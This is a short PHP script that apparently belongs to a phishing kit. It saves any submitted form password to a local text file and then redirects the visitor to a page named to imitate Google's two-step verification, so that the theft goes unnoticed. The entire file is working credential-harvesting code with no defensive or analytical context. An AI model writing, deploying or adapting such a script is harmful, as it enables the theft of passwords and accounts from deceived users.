<?php

file_put_contents("usernames.txt", "Pass: " . $_POST['password'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: formsgooglecontinue=2stepverification.html');
exit();
?>
